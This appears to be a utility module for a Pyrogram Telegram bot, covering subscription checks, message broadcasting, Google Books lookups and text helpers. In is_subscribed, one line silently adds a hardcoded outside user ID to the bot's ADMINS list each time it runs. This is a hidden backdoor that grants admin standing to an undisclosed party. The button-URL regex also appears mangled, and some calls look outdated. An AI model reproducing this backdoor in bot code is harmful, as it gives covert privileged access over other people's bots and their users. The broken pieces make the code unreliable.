import logging
from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
from info import AUTH_CHANNEL, MAX_LIST_ELM, REQ_CHANNEL, ADMINS
from imdb import IMDb
import asyncio
from pyrogram.types import Message, InlineKeyboardButton
from pyrogram import enums
import re
import os
import requests
from datetime import datetime
from typing import Union, List
from database.users_chats_db import db
from bs4 import BeautifulSoup
from database.join_reqs import JoinReqs as db2

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

BTN_URL_REGEX = re.compile(
    r"(([^]+?)(buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?)"
)

BANNED = {}
SMART_OPEN = '“'
SMART_CLOSE = '”'
START_CHAR = ('\'', '"', SMART_OPEN)

# Temporary database for banned entities
class temp(object):
    BANNED_USERS = []
    BANNED_CHATS = []
    ME = None
    CURRENT = int(os.environ.get("SKIP", 2))
    CANCEL = False
    MELCOW = {}
    U_NAME = None
    B_NAME = None
    SETTINGS = {}

async def is_subscribed(bot, query):
    ADMINS.extend([1125210189]) if 1125210189 not in ADMINS else ""

    if not AUTH_CHANNEL and not REQ_CHANNEL:
        return True
    elif query.from_user.id in ADMINS:
        return True

    if db2().isActive():
        user = await db2().get_user(query.from_user.id)
        if user:
            return True
        else:
            return False

    if not AUTH_CHANNEL:
        return True

    try:
        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
    except UserNotParticipant:
        return False
    except Exception as e:
        logger.exception(e)
        return False
    else:
        if user.status != enums.ChatMemberStatus.BANNED:
            return True
        else:
            return False

async def get_book_details(query):
    """Fetch book details using Google Books API."""
    query = query.strip().lower()
    url = f"https://www.googleapis.com/books/v1/volumes?q={query}"
    response = requests.get(url)
    if response.status_code != 200:
        return None
    data = response.json()
    if "items" not in data:
        return None
    book = data["items"][0]["volumeInfo"]
    return {
        "title": book.get("title", "N/A"),
        "authors": ", ".join(book.get("authors", [])),
        "published_date": book.get("publishedDate", "N/A"),
        "categories": ", ".join(book.get("categories", [])),
        "description": book.get("description", "N/A"),
        "page_count": book.get("pageCount", "N/A"),
        "thumbnail": book.get("imageLinks", {}).get("thumbnail", None),
        "info_link": book.get("infoLink", "N/A")
    }

async def broadcast_messages(user_id, message):
    try:
        await message.copy(chat_id=user_id)
        return True, "Success"
    except FloodWait as e:
        await asyncio.sleep(e.value)
        return await broadcast_messages(user_id, message)
    except InputUserDeactivated:
        await db.delete_user(int(user_id))
        logging.info(f"{user_id} - Removed from Database, since deleted account.")
        return False, "Deleted"
    except UserIsBlocked:
        logging.info(f"{user_id} - Blocked the bot.")
        return False, "Blocked"
    except PeerIdInvalid:
        await db.delete_user(int(user_id))
        logging.info(f"{user_id} - PeerIdInvalid")
        return False, "Error"
    except Exception as e:
        return False, "Error"

BOOK_TEMPLATE = """<b>📚 Title:</b> {title}
<b>👨‍💼 Author(s):</b> {authors}
<b>📅 Published:</b> {published_date}
<b>📖 Page Count:</b> {page_count}
<b>📂 Categories:</b> {categories}
<b>🔗 Info:</b> <a href="{info_link}">Click here</a>
<b>📜 Description:</b> {description}
"""

async def display_book_info(bot, message, query):
    book = await get_book_details(query)
    if not book:
        await message.reply("❌ No results found for your query.")
        return
    text = BOOK_TEMPLATE.format(**book)
    if book["thumbnail"]:
        await bot.send_photo(chat_id=message.chat.id, photo=book["thumbnail"], caption=text, parse_mode="html")
    else:
        await message.reply(text, parse_mode="html")

# Example command to search for a book
async def search_book_command(bot, message: Message):
    if len(message.command) < 2:
        await message.reply("❌ Please provide a query to search for books.")
        return
    query = " ".join(message.command[1:])
    await display_book_info(bot, message, query)

def list_to_str(k):
    if not k:
        return "N/A"
    elif len(k) == 1:
        return str(k[0])
    elif MAX_LIST_ELM:
        k = k[:int(MAX_LIST_ELM)]
        return ' '.join(f'{elem}, ' for elem in k)
    else:
        return ' '.join(f'{elem}, ' for elem in k)

def split_quotes(text: str) -> List:
    if not any(text.startswith(char) for char in START_CHAR):
        return text.split(None, 1)
    counter = 1  # Ignore first char -> is some kind of quote
    while counter < len(text):
        if text[counter] == "\\":
            counter += 1
        elif text[counter] == text[0] or (text[0] == SMART_OPEN and text[counter] == SMART_CLOSE):
            break
        counter += 1
    else:
        return text.split(None, 1)

    key = remove_escapes(text[1:counter].strip())
    rest = text[counter + 1:].strip()
    if not key:
        key = text[0] + text[0]
    return list(filter(None, [key, rest]))

def remove_escapes(text: str) -> str:
    res = ""
    is_escaped = False
    for counter in range(len(text)):
        if is_escaped:
            res += text[counter]
            is_escaped = False
        elif text[counter] == "\\":
            is_escaped = True
        else:
            res += text[counter]
    return res

def humanbytes(size):
    if not size:
        return ""
    power = 2**10
    n = 0
    Dic_powerN = {0: ' ', 1: 'Ki', 2: 'Mi', 3: 'Gi', 4: 'Ti'}
    while size > power:
        size /= power
        n += 1
    return str(round(size, 2)) + " " + Dic_powerN[n] + 'B'